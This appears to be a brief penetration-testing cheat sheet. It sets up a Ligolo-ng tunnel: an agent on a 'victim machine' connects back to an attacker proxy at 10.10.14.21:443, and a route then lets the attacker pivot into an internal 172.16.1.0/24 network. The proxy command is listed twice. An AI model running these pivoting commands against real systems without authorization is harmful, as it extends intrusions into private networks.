### Host Machine

```
sudo ip tuntap add user p3ta mode tun ligolo 
```

```
sudo ip link set ligolo up
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

### On Victim Machine

```
./agent -connect 10.10.14.21:443 -ignore-cert
```

### On Host Machine

```
sudo ip route add 172.16.1.0/24 dev ligolo
```